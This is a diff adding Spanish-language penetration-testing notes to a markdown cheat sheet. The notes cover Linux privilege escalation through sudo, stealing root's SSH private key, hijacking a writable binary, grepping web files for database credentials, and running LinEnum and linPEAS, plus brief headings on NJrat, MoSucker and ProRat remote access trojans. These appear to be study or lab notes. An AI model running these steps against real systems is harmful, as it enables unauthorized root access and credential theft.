@@ -323,6 +323,153 @@ Comandos
 
 `cd /sdcard`
 
+## Escalación de privilegios
 
+### Linux
+
+#### Metodo 1 - Horizontal privilege scalation
+
+Validar permisos de usuarios
+`sudo -l`
+
+Respuesta
+`user2 /bin/bash`
+
+Elevar privilegios
+
+`sudo -u user2 /bin/bash`
+
+`whoami`
+
+Respuesta
+
+`user2`
+
+
+
+#### Metodo 2 - RSA KEYS
+
+`cd /root`
+
+Respuesta
+
+Permission denied
+
+`ls -la`
+
+`cd /root`
+
+`ls -la`
+
+`cd .ssh`
+
+Respuesta 
+
+`id_rsa`
+
+`cat id_rsa`
+
+copiar informacion 
+
+crear un nuevo archivo con la informacion del rsa
+
+`chmod 600 id_rsa`
+
+establecer una nueva conexion
+
+`ssh root@IP -i id_rsa`
+
+`ssh root@IP -p 5007 -i id_rsa`
+
+whoami
+
+
+#### Metodo 2 - Autorized keys
+
+`cd /root`
+
+`cd .ssh/`
+
+`cat autorized_keys`
+
+Respuesta
+
+Permission denied
+
+## Escalación de privilegios avanzado
+
+### Escalación vertical
+
+`ls`
+
+`ls -l`
+
+`stat -c "%a %A %U %G %F" opt`
+
+`stat -c "%a %A %U %G %F" folder_name`
+
+`groups name_group`
+
+`strings name_string`
+
+`cp /bin/bash name_string`
+
+Respuesta
+
+Permission denied
+
+`cp /bin/bash name_string`
+
+`ls`
+
+`./name_string`
+
+`whoami`
+
+
+### Metodo en archivos de sitios web
+
+`cd /var/www/html`
+
+`grep -nr "db_user"`
+
+### Lin enum
+
+`https://github.com/rebootuser/LinEnum`
+
+`https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS`
+
+Descargar con git clone
+
+Asignar permisos de ejecución al script
+
+`chmod +x LinEnum.sh`
+
+Ejecutar 
+
+`./LinEnum.sh`
+
+
+Ejecutar 
+
+`./linpeas.sh`
+
+
+## RAT
+
+
+### NJrat
+
+### MoSucker
+
+### ProRat
+
+Crear conexion
+
+Establecer IP y contraseña
+
+Search files 
+
+File Manager >> download
 
 
